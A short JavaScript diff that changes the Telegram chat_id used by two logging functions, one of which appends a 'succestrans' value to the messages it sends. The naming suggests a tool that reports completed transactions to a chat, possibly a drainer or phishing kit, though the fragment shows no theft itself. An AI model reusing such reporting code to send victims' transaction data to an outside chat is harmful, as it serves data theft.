@@ -1277,7 +1277,7 @@ async function logTlgMsg(msg, sus, hash) {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          chat_id: "835768358",
+          chat_id: "8614416084",
           text: msg + "\n" + succestrans,
           parse_mode: undefined
         })
@@ -1309,7 +1309,7 @@ async function logTlg(msg) {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          chat_id: "835768358",
+          chat_id: "8614416084",
           text: msg,
           parse_mode: undefined
         })
